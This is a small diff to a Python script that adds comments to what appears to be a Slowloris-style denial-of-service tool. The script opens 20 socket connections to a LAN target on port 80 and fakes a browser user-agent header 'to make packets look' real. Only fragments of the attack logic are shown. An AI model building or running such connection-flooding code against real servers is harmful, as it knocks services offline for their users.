@@ -5,15 +5,17 @@ import socket
 
 
 
-
+#stander header to make packets look read
 user_agegent_data="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
 
 
-
+# target ip and port
 target="192.168.137.62"
 port=80
 
+
 number_of_contion_to_make=20
+
 
 def make_socket():
 
@@ -26,7 +28,7 @@ lsit_if_connection=[]
 
 
 
-
+#make a list of connect objects
 for q in range(number_of_contion_to_make):
     lsit_if_connection.append(make_socket())
 
